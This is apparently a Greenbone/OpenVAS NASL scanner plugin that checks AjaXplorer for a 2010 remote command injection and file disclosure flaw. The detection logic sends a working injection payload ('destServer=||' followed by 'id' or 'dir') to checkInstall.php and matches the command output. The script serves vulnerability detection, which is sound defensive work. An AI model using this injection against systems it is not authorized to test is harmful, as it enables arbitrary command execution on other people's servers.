if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100574" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-04-13 13:16:59 +0200 (Tue, 13 Apr 2010)" );
	script_bugtraq_id( 39334 );
	script_tag( name: "cvss_base", value: "5.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:P/I:P/A:P" );
	script_name( "AjaXplorer Remote Command Injection and Local File Disclosure Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/39334" );
	script_xref( name: "URL", value: "http://www.ajaxplorer.info/wordpress/2010/04/ajaxplorer-2-6-security-ajaxplorer-2-7-1-early-beta-for-3-0/" );
	script_xref( name: "URL", value: "http://www.ajaxplorer.info" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "gb_AjaXplorer_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "AjaXplorer/installed" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "summary", value: "AjaXplorer is prone to a remote command injection vulnerability and a
local file disclosure vulnerability because it fails to adequately
sanitize user-supplied input data.

Attackers can exploit this issue to execute arbitrary commands within
the context of the affected application and to obtain potentially
sensitive information from local files on computers running the
vulnerable application. This may aid in further attacks.

Versions prior to AjaXplorer 2.6 are vulnerable." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("version_func.inc.sc");
port = http_get_port( default: 80 );
if(!dir = get_dir_from_kb( port: port, app: "AjaXplorer" )){
	exit( 0 );
}
cmds = make_array( "uid=[0-9]+.*gid=[0-9]+", "id", "<dir>", "dir" );
for cmd in keys( cmds ) {
	url = NASLString( dir, "/plugins/access.ssh/checkInstall.php?destServer=||", cmds[cmd] );
	if(http_vuln_check( port: port, url: url, pattern: cmd )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 0 );

